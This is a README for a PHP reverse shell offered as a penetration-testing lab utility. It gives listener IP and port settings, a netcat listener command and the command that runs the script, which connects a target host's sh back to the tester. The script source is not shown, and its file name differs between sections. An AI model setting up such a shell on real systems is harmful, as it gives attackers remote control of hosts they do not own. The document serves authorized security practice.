# PHP Reverse Shell (Lab Utility)

## Overview

`reverse_shell.php` is a command-line/web PHP script designed for authorized security testing, penetration testing practice, and isolated lab environments. It initiates an outbound TCP connection from a target host to a designated listener and attaches a shell process (`sh`) to the socket stream.

## Project Structure

```text
project_root/
    php_reverse_shell.php
    php_reverse_shell_README.md
```

## Prerequisites

   An isolated testing or lab environment where you have explicit authorization to test.

   PHP installed on the target host with socket and process execution functions enabled (fsockopen, proc_open, stream_set_blocking).

   A TCP listener tool such as Netcat (nc) running on the testing host.

## Configuration

   Open reverse_shell.php and update the listener connection details before running it in your lab:
   PHP

```bash
$listener_ip = "192.168.1.50";
$listener_port = 4444;
```

## Usage

1. Start the Listener

On your testing machine, start a listener on the configured port:

```Bash
nc -lvnp 4444
```

1. Run the PHP Script
    Execute the script from the command line or trigger it via a web server in your test environment:

```Bash
php reverse_shell.php
```

## Troubleshooting

Connection Refused or Timed Out: Verify the listener IP address and port, ensure the listener is actively running before executing the script, and check host or network firewall rules.

Disabled Functions: If proc_open or fsockopen fails due to server hardening, check the disable_functions directive in php.ini on the lab host.

Shell Output Issues: Confirm that /bin/sh exists and is executable on the target system.

## Disclaimer

Use this script strictly within authorized networks, lab environments, or systems you own and administer.
